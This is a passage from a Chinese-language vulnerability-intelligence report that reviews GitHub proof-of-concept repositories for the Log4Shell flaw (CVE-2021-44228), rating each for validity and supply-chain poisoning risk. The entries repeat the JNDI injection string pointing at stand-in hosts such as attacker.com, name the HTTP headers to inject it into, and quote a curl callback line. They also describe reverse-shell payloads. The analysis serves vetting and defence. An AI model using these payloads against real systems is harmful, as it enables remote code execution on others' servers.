**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
